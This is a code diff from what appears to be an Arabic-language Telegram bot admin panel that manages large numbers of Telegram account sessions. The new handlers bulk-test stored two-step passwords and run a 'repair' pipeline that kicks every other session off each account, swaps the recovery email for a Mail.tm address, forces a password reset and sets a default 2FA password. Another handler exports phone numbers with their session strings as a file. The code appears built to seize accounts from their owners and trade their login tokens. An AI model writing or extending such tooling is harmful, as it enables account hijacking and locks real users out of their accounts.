@@ -31,7 +31,8 @@ from keyboards import (
     back_to_session_keyboard, ADMIN_FOOTER, CB,
     admin_empty_keyboard, user_messages_menu_keyboard,
     unsecured_sessions_keyboard, disabled_sessions_keyboard,
-    kick_specific_keyboard,
+    kick_specific_keyboard, invalid_two_fa_sessions_keyboard,
+    no_two_fa_sessions_keyboard,
 )
 
 logging.basicConfig(level=logging.INFO)
@@ -713,6 +714,46 @@ async def _on_admin_event(phone: str, event: str, **data):
         text = base + "♻️ <b>جاري الإنعاش</b> — طلب كود من تيليجرام → Mail.tm"
     elif event == "session_alive_again":
         text = base + "✅ <b>الجلسة متصلة مجدداً</b> — أُلغي إنذار التوقف"
+    elif event == "repair_2fa_kicked":
+        ok = data.get("ok", False)
+        err = data.get("error", "")
+        text = (
+            base
+            + (f"✅ <b>تم طرد كل الجلسات</b> — إصلاح التحقق" if ok
+               else f"⚠️ <b>فشل طرد الجلسات</b>: <code>{h(err)}</code> — متابعة الإصلاح")
+        )
+    elif event == "repair_2fa_email":
+        ok = data.get("ok", False)
+        email = data.get("email", "")
+        text = (
+            base
+            + (f"✅ <b>تم تغيير البريد</b>: <code>{h(email)}</code>" if ok
+               else "⚠️ <b>فشل تغيير البريد</b> — متابعة الإصلاح")
+        )
+    elif event == "repair_2fa_reset_requested":
+        days = data.get("wait_days", 7)
+        text = (
+            base
+            + f"⏳ <b>طلب إعادة تعيين كلمة المرور</b>\n"
+            + (f"ستكتمل إعادة التعيين خلال <b>{days}</b> يوم تقريباً." if days > 0
+               else "✅ اكتملت إعادة التعيين فوراً — جاري تعيين التحقق الجديد.")
+        )
+    elif event == "repair_2fa_success":
+        pwd = data.get("password", DEFAULT_2FA_PASSWORD)
+        text = (
+            base
+            + "✅ <b>تم إصلاح التحقق بخطوتين!</b>\n"
+            + f"🔐 كلمة المرور الجديدة: <code>{h(pwd)}</code>\n"
+            + "تم إزالة الحساب من قائمة التحققات غير الصالحة."
+        )
+    elif event == "repair_2fa_fail":
+        step = data.get("step", "")
+        err = data.get("error", "")
+        text = (
+            base
+            + f"❌ <b>فشل إصلاح التحقق</b> — المرحلة: {h(step)}\n"
+            + f"<code>{h(err)}</code>"
+        )
     else:
         return
 
@@ -1390,6 +1431,250 @@ async def purge_secured_invalid_confirm(callback: CallbackQuery):
 # ══════════════════════════════════════════
 
 # ── تغيير ج جماعي: طلب تأكيد ──
+# ══════════════════════════════════════════
+# فحص صحة التحقق بخطوتين (جماعي)
+# ══════════════════════════════════════════
+
+@dp.callback_query(F.data == "check_two_fa_all")
+async def check_two_fa_all_prompt(callback: CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        await callback.answer()
+        return
+    await callback.message.edit_text(
+        "🔍 <b>فحص صحة التحقق بخطوتين — كل الحسابات</b>\n\n"
+        "سيتم اختبار التحقق المخزون في قاعدة البيانات لكل جلسة نشطة.\n\n"
+        "• الحسابات التي تفشل تُضاف لقائمة «تحققها غير صالح»\n"
+        "• العملية تستغرق عدة دقائق حسب عدد الحسابات\n\n"
+        "متأكد؟" + ADMIN_FOOTER,
+        parse_mode="HTML",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [
+                InlineKeyboardButton(text="✅ متأكد", callback_data="check_two_fa_all_confirm"),
+                InlineKeyboardButton(text="❌ إلغاء", callback_data="back_to_sessions"),
+            ]
+        ]),
+    )
+    await callback.answer()
+
+
+@dp.callback_query(F.data == "check_two_fa_all_confirm")
+async def check_two_fa_all_confirm(callback: CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        await callback.answer()
+        return
+    uid = callback.from_user.id
+    _bulk_stop_flags[uid] = False
+    await callback.answer("⏳ بدأ الفحص...")
+
+    msg = callback.message
+    await msg.edit_text(
+        "🔍 <b>فحص صحة التحقق — جاري المعالجة...</b>\n\n"
+        "⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜  0%\n"
+        "✅ صالح: 0  ❌ غير صالح: 0  ⏭️ تخطى: 0\n"
+        "📊 الحساب: 0 / ?" + ADMIN_FOOTER,
+        parse_mode="HTML",
+        reply_markup=_stop_bulk_keyboard("verify_2fa", uid),
+    )
+
+    _last_edit = [0.0]
+
+    async def progress_cb(done, total, valid_n, invalid_n, skip_n):
+        import time
+        now = time.monotonic()
+        if done % 5 != 0 and now - _last_edit[0] < 15:
+            return
+        _last_edit[0] = now
+        pct = int(done / total * 100) if total else 0
+        filled = pct // 10
+        bar = "🟩" * filled + "⬜" * (10 - filled)
+        text = (
+            f"🔍 <b>فحص صحة التحقق — جاري المعالجة...</b>\n\n"
+            f"{bar}  {pct}%\n"
+            f"✅ صالح: {valid_n}  ❌ غير صالح: {invalid_n}  ⏭️ تخطى: {skip_n}\n"
+            f"📊 الحساب: {done} / {total}" + ADMIN_FOOTER
+        )
+        try:
+            await msg.edit_text(
+                text, parse_mode="HTML",
+                reply_markup=_stop_bulk_keyboard("verify_2fa", uid),
+            )
+        except Exception:
+            pass
+
+    result = await session_manager.bulk_verify_two_fa(
+        progress_cb=progress_cb,
+        should_stop=lambda: _bulk_stop_flags.get(uid, False),
+    )
+    _bulk_stop_flags.pop(uid, None)
+
+    invalid_n = result.get("invalid", 0)
+    lines = [
+        "🔍 <b>اكتمل فحص صحة التحقق</b>\n",
+        f"✅ صالح: <b>{result['valid']}</b>",
+        f"❌ غير صالح: <b>{invalid_n}</b>",
+        f"⏭️ تخطى (غير متصل/بلا تحقق): <b>{result['skip']}</b>",
+        f"📊 المجموع: <b>{result['total']}</b>",
+    ]
+    if invalid_n > 0:
+        lines.append(f"\n⚠️ <b>{invalid_n} حساب لديها تحقق غير صالح</b> — اضغط «تحققها غير صالح» للعرض والإصلاح.")
+    await msg.edit_text(
+        "\n".join(lines) + ADMIN_FOOTER,
+        parse_mode="HTML",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="❗ تحققها غير صالح", callback_data="list_invalid_two_fa")],
+            [InlineKeyboardButton(text="🔙 رجوع", callback_data="back_to_sessions")],
+        ]),
+    )
+
+
+# ══════════════════════════════════════════
+# قائمة الحسابات ذات التحقق غير الصالح
+# ══════════════════════════════════════════
+
+@dp.callback_query(F.data == "list_invalid_two_fa")
+async def list_invalid_two_fa_handler(callback: CallbackQuery, state: FSMContext):
+    if not is_admin(callback.from_user.id):
+        await callback.answer()
+        return
+    uid = callback.from_user.id
+    sessions = await database.get_sessions_with_invalid_two_fa(uid, SUPER_ADMIN_IDS)
+    if not sessions:
+        await callback.answer("✅ لا توجد حسابات بتحقق غير صالح!", show_alert=True)
+        return
+    repairing = sum(
+        1 for s in sessions
+        if s["repair_2fa_stage"] is not None and s["repair_2fa_stage"] < 3
+    )
+    status_line = f"\n🔧 قيد الإصلاح الآن: {repairing}" if repairing else ""
+    await callback.message.edit_text(
+        f"❗ <b>حسابات تحققها غير صالح ({len(sessions)})</b>\n\n"
+        f"هذه الحسابات لديها تحقق بخطوتين في DB لكنه خاطئ على تيليجرام.{status_line}\n\n"
+        f"اضغط «إصلاح الكل» لتشغيل خط الإصلاح التلقائي (طرد + بريد + إعادة تعيين 7 أيام)."
+        + ADMIN_FOOTER,
+        parse_mode="HTML",
+        reply_markup=invalid_two_fa_sessions_keyboard(sessions, page=0),
+    )
+    await callback.answer()
+
+
+@dp.callback_query(F.data.startswith("invalid_two_fa_page_"))
+async def invalid_two_fa_page_handler(callback: CallbackQuery, state: FSMContext):
+    if not is_admin(callback.from_user.id):
+        await callback.answer()
+        return
+    uid = callback.from_user.id
+    page = int(callback.data.split("_")[-1])
+    sessions = await database.get_sessions_with_invalid_two_fa(uid, SUPER_ADMIN_IDS)
+    if not sessions:
+        await callback.answer("✅ لا توجد حسابات.")
+        return
+    await callback.message.edit_text(
+        f"❗ <b>حسابات تحققها غير صالح ({len(sessions)})</b>" + ADMIN_FOOTER,
+        parse_mode="HTML",
+        reply_markup=invalid_two_fa_sessions_keyboard(sessions, page=page),
+    )
+    await callback.answer()
+
+
+@dp.callback_query(F.data == "repair_invalid_two_fa_all")
+async def repair_invalid_two_fa_all_handler(callback: CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        await callback.answer()
+        return
+    uid = callback.from_user.id
+    sessions = await database.get_sessions_with_invalid_two_fa(uid, SUPER_ADMIN_IDS)
+    if not sessions:
+        await callback.answer("✅ لا يوجد حسابات تحتاج إصلاح.", show_alert=True)
+        return
+
+    started = 0
+    already = 0
+    for s in sessions:
+        phone = s["phone"]
+        if s["repair_2fa_stage"] is not None and s["repair_2fa_stage"] < 3:
+            already += 1
+            continue
+        session_manager.schedule_repair_two_fa(phone)
+        await database.update_repair_2fa_stage(phone, 0)
+        started += 1
+
+    lines = [
+        f"🔧 <b>تم بدء إصلاح التحقق</b>\n",
+        f"🚀 بُدئ حديثاً: <b>{started}</b>",
+    ]
+    if already:
+        lines.append(f"⏳ قيد الإصلاح مسبقاً: <b>{already}</b>")
+    lines.append(
+        "\n<i>ستصلك إشعار لكل مرحلة (طرد، بريد، إعادة تعيين، نجاح/فشل).\n"
+        "الانتظار 7 أيام حتى تكتمل إعادة التعيين — البوت يتابع تلقائياً.</i>"
+    )
+    await callback.message.edit_text(
+        "\n".join(lines) + ADMIN_FOOTER,
+        parse_mode="HTML",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="❗ تحديث القائمة", callback_data="list_invalid_two_fa")],
+            [InlineKeyboardButton(text="🔙 رجوع", callback_data="back_to_sessions")],
+        ]),
+    )
+    await callback.answer(f"✅ بدأ إصلاح {started} حساب")
+
+
+# ══════════════════════════════════════════
+# سحب الجلسات المؤمنة + تحقق شغال فقط
+# ══════════════════════════════════════════
+
+@dp.callback_query(F.data == "export_secured_valid_two_fa")
+async def export_secured_valid_two_fa_handler(callback: CallbackQuery):
+    if not is_admin(callback.from_user.id):
+        await callback.answer()
+        return
+    uid = callback.from_user.id
+    sessions = await database.get_secured_sessions_valid_two_fa(uid, SUPER_ADMIN_IDS)
+    if not sessions:
+        await callback.answer(
+            "❌ لا توجد جلسات مؤمنة بتحقق شغال.\n"
+            "قم بفحص التحقق أولاً من زر «فحص صحة التحقق».",
+            show_alert=True,
+        )
+        return
+
+    await callback.message.edit_text(
+        "⏳ جاري تجهيز ملف الجلسات المؤمنة (تحقق شغال)...", parse_mode="HTML"
+    )
+    lines = []
+    for s in sessions:
+        ss = s["session_string"]
+        if not ss or not str(ss).strip():
+            ss = await session_manager.ensure_session_string(s["phone"])
+        if ss:
+            lines.append(f"{s['phone']}:{ss}")
+
+    if not lines:
+        await callback.message.edit_text("❌ لا توجد أكواد جلسات لإرسالها.")
+        return
+
+    document = BufferedInputFile(
+        "\n".join(lines).encode("utf-8"),
+        filename="secured_valid_2fa_sessions.txt",
+    )
+    await callback.message.answer_document(
+        document=document,
+        caption=(
+            f"✅ <b>جلسات مؤمنة + تحقق شغال ({len(lines)} حساب)</b>\n"
+            f"<i>تم استبعاد الحسابات ذات التحقق غير الصالح.</i>"
+            + ADMIN_FOOTER
+        ),
+        parse_mode="HTML",
+    )
+    all_s = await _sessions_for_admin(uid)
+    text = await _admin_panel_text(uid)
+    await callback.message.edit_text(
+        text,
+        reply_markup=sessions_keyboard(all_s, is_super_admin=is_super_admin(uid)),
+        parse_mode="HTML",
+    )
+
+
 @dp.callback_query(F.data == "rotate_sessions_all")
 async def rotate_sessions_all_prompt(callback: CallbackQuery):
     if not is_super_admin(callback.from_user.id):
@@ -1415,6 +1700,19 @@ async def rotate_sessions_all_prompt(callback: CallbackQuery):
 @dp.callback_query(F.data.regexp(r"^stop_bulk_rotate_\d+$"))
 async def stop_bulk_rotate(callback: CallbackQuery):
     if not is_super_admin(callback.from_user.id):
+        await callback.answer()
+        return
+    uid = int(callback.data.split("_")[-1])
+    if uid != callback.from_user.id:
+        await callback.answer("❌ ليس لك صلاحية إيقاف هذه العملية", show_alert=True)
+        return
+    _bulk_stop_flags[uid] = True
+    await callback.answer("⛔ تم إرسال طلب الإيقاف — سيتوقف بعد الحساب الحالي", show_alert=True)
+
+
+@dp.callback_query(F.data.regexp(r"^stop_bulk_verify_2fa_\d+$"))
+async def stop_bulk_verify_2fa(callback: CallbackQuery):
+    if not is_admin(callback.from_user.id):
         await callback.answer()
         return
     uid = int(callback.data.split("_")[-1])
@@ -2076,7 +2374,6 @@ async def list_no_two_fa_handler(callback: CallbackQuery, state: FSMContext):
     if not sessions:
         await callback.answer("✅ جميع الجلسات الصالحة لديها تحقق بخطوتين!", show_alert=True)
         return
-    from keyboards import no_two_fa_sessions_keyboard
     await callback.message.edit_text(
         f"⚠️ <b>الجلسات بلا تحقق بخطوتين ({len(sessions)})</b>\n\n"
         f"هذه الجلسات صالحة لكن ليس لها <code>two_fa</code> محفوظ في قاعدة البيانات.\n"
@@ -2098,7 +2395,6 @@ async def no_two_fa_page_handler(callback: CallbackQuery, state: FSMContext):
     if not sessions:
         await callback.answer("✅ لا توجد جلسات.")
         return
-    from keyboards import no_two_fa_sessions_keyboard
     await callback.message.edit_text(
         f"⚠️ <b>الجلسات بلا تحقق بخطوتين ({len(sessions)})</b>" + ADMIN_FOOTER,
         parse_mode="HTML",
@@ -2873,6 +3169,7 @@ async def _startup_email_migration():
     except Exception as e:
         logging.error("email migration startup: %s", e)
     await session_manager.resume_auto_kick_pipelines()
+    await session_manager.resume_repair_two_fa_pipelines()
 
 
 async def _startup_session_recovery():
